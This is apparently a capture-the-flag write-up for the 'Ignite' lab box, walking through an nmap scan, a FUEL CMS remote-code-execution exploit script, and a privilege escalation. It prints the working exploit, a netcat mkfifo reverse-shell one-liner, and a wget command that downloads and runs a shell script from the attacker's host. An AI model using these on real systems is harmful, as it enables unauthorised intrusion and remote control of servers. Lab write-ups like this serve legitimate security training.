# Ignite

### A new start-up has a few issues with their web server.

### Root the box! Designed and created by DarkStar7471, built by Paradox.

## Recognition

### NMAP

> nmap -sCV -A -O 10.10.226.192

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-23 15:17 EDT
Nmap scan report for 10.10.226.192
Host is up (0.77s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/23%OT=80%CT=1%CU=42858%PV=Y%DS=4%DC=T%G=Y%TM=5F932C
OS:B0%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=A)SE
OS:Q(SP=106%GCD=1%ISR=10B%TI=Z%CI=I%TS=A)OPS(O1=M508ST11NW6%O2=M508ST11NW6%
OS:O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=68DF%W2
OS:=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNS
OS:NW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops

TRACEROUTE (using port 554/tcp)
HOP RTT       ADDRESS
1   472.70 ms 10.4.0.1
2   ... 3
4   794.13 ms 10.10.226.192

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 123.72 seconds

```

### Site

![image](https://user-images.githubusercontent.com/53917092/97047048-bb5d0500-154e-11eb-9d20-36f4418aec03.png)

![image](https://user-images.githubusercontent.com/53917092/97047124-d92a6a00-154e-11eb-890b-a2e6fc7d34ca.png)

#### Visiting /fuel

we have a login page

![image](https://user-images.githubusercontent.com/53917092/97047273-155dca80-154f-11eb-84ce-b39629091079.png)


So I searched about this system (fuelcms) on the exploitdb site and found this:

![image](https://user-images.githubusercontent.com/53917092/97047803-e3993380-154f-11eb-95d2-cf25f25b5bac.png)

I will use the RCE Exploit because other else requires authentication and we don't have any credentials

the exploit be like

```

import requests
import urllib

url = raw_input('target (http://IP:PORT) : ')
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
	xxxx = raw_input('cmd:')
	burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"
	r = requests.get(burp0_url)

	html = "<!DOCTYPE html>"
	htmlcharset = r.text.find(html)

	begin = r.text[0:20]
	dup = find_nth_overlapping(r.text,begin,2)

	print r.text[0:dup]
```

and it uses python2

### Exploiting

![image](https://user-images.githubusercontent.com/53917092/97048985-4e973a00-1551-11eb-99fa-5cbcd09522a4.png)

## getting a reverse shell

using the RCE we check that the machine has WGET command

![image](https://user-images.githubusercontent.com/53917092/97049144-91591200-1551-11eb-869f-77e1d309f88e.png)

so I will use this to download and run a reverse shell file

so I created a .sh file on my machine that contains it:

> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f

and to access the machine, I used a python server

> nc -lvp PORT

> python3 -m http.server 80

![image](https://user-images.githubusercontent.com/53917092/97050038-0c6ef800-1553-11eb-8d9e-7a41cee2fbdf.png)

now I will download the file and run it in the box using RCE

> wget IP/revshell.sh -O /tmp/revshell.sh; sh /tmp/revshell.sh

![image](https://user-images.githubusercontent.com/53917092/97050364-97e88900-1553-11eb-8070-f63957ed97fd.png)

![image](https://user-images.githubusercontent.com/53917092/97050414-af277680-1553-11eb-9c0a-82eb8efaedfa.png)

it works

### getting a tty

checking if we have python

> whereis python

![image](https://user-images.githubusercontent.com/53917092/97050672-2d841880-1554-11eb-8c26-34b715bb5ed8.png)

we have python2 and python3, and we will use it

> python -c 'import pty;pty.spawn("/bin/bash")'

![image](https://user-images.githubusercontent.com/53917092/97050816-6de39680-1554-11eb-884c-304bdb41cec8.png)

### User Flag

![image](https://user-images.githubusercontent.com/53917092/97051978-8f458200-1556-11eb-9655-5c6aef004e72.png)

### Privilege escalation

again using wget, we will use LinPeas to enumarate possibles privilege escalation vectors

downloading

again we will download on our machine, upload a server and then download in the box through our machine

in our machine:

> wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh

> chmod +x linpeas.sh

> python3 -m http.server 80

in the box

> cd /tmp
> wget IP:/linpeas.sh

giving the permissions

> chmod +x linpeas.sh

running

> ./linpeas.sh > output.txt

reading output

> cat output.txt

### Privilege Escalation

![image](https://user-images.githubusercontent.com/53917092/97056470-768d9a00-155f-11eb-8d24-a72a0fcd1d02.png)

checking out this database

![image](https://user-images.githubusercontent.com/53917092/97056626-d08e5f80-155f-11eb-9b0f-9815f51646ee.png)

![image](https://user-images.githubusercontent.com/53917092/97056655-e1d76c00-155f-11eb-9ff1-a64e376d405c.png)

trying using this password

![image](https://user-images.githubusercontent.com/53917092/97056752-177c5500-1560-11eb-84bf-9bac6799a1f9.png)

### User flag

![image](https://user-images.githubusercontent.com/53917092/97056937-8659ae00-1560-11eb-803b-ccae406fa5ab.png)

that's it, thanks for reading